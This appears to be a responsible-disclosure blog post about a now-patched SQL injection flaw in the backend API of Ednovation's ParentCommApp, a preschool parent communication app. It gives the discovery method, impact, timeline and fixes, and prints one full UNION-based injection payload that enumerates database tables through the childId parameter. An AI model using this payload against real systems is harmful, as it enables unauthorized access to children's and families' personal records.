---
layout: post
# Possible CVE status: "CVE REQUESTED", "CVE RESERVED", "REPORTED", "FIXED", "FIXED – NO CVE", "NO RESPONSE", "UNPATCHED", "CVE-YYYY-NNNNN"
title: "[CVE REQUESTED] ParentCommApp SQL Injection Backend API"
date: 2025-07-26
cve: "Reported"
status: "Fixing"
categories: [Disclosure]
tags: [cve-requested, CVE, sql-injection, pii-exposure, ednovation, parentcommapp, vulnerability, ios, api]
permalink: /disclosures/parentcommapp-sql-injection-backend-api/
---

## Summary

A **SQL injection vulnerability** was identified in a backend API supporting Ednovation's ParentCommApp — a communication platform used by preschools and parents. The vulnerability allows attackers to manipulate request parameters and potentially extract unauthorized records from the database.

> **Ednovation**, headquartered in Singapore, is a leading provider of preschool education services across Asia, has evolved into a chain of more than 60 pre-schools and enrichment centres across Singapore, China and ASEAN.

## Background & Discovery

This issue was discovered while testing the ParentCommApp on iOS, where traffic was intercepted using **Burp Suite**. After logging in and intercepting traffic, it was observed that the API call used to fetch child attendance status did not include any form of validation and accepted unsanitized input — indicating a server-side flaw rather than a client implementation issue.

## Affected Product

- **Vendor**: Ednovation ([https://ednovation.com](https://ednovation.com))
- **App**: ParentCommApp (iOS)
- **Platform**: Backend APIs serving iOS/Android apps
- **Version**: Affected prior to 2022 remediation

## Vulnerability Details

While testing the iOS version of ParentCommApp using **Burp Suite**, an API call responsible for fetching child attendance status was observed to be vulnerable to **SQL injection**.

The vulnerable API accepted a `childId` parameter via POST request body and failed to sanitize the input. Manual testing with SQL payloads like:

```sql
'date=Sun%20Jun%2026%2016%3A19%3A23%20GMT%2B0800%202022&childId=12 UNioN \x0d\x0a  (\x0d\x0a    SELECT 111, 222, 333, 444, 555, 666, 777, 888, 999, 101010,\x0d\x0a      group_concat(a.combine separator \',\'), \x0d\x0a      121212, 131313, 141414   \x0d\x0a    from \x0d\x0a      (\x0d\x0a        SELECT \x0d\x0a          concat(\x0d\x0a            \'\"\', \x0d\x0a            table_name, \x0d\x0a            \'\"\', \x0d\x0a            \':\', \x0d\x0a            \'[\', \x0d\x0a            GROUP_CONCAT(\x0d\x0a              concat(\'\"\', COLUMN_NAME, \'\"\') separator \',\'\x0d\x0a            ), \x0d\x0a            \']\'\x0d\x0a          ) as combine \x0d\x0a        FROM \x0d\x0a          INFORMATION_SCHEMA.COLUMNS \x0d\x0a        WHERE \x0d\x0a          TABLE_SCHEMA = \'dev_XXXX\' \x0d\x0a        GROUP BY \x0d\x0a          TABLE_NAME \x0d\x0a        ORDER BY \x0d\x0a          table_name\x0d\x0a      ) as a\x0d\x0a  )\x0d\x0alimit 1,2#&action=getChildAttendanceStatus'
```

resulted in expanded database output, confirming an **authentication-independent injection flaw**.

## Exploitation Impact

- **Sensitive data disclosure**: Unauthorized access to other child/parent/teacher records
- **Database enumeration**: Potential for data extraction beyond target record

## Timeline

- **2022-07**: Issue discovered and responsibly reported to vendor  
- **2022-07**: Vendor acknowledged and deployed a patch  
- **2025-07**: Disclosure and CVE request initiated  

## Status

- ✅ **Reported**: 2022  
- ✅ **Vendor fixed**: 2022  
- 🚩 **CVE Status**: Pending Assignment  
- 📢 **Public Disclosure**: 2025-07  

## Recommendations

Vendors should validate and sanitize all input parameters server-side. Use parameterized queries and ORM frameworks to prevent injection flaws.
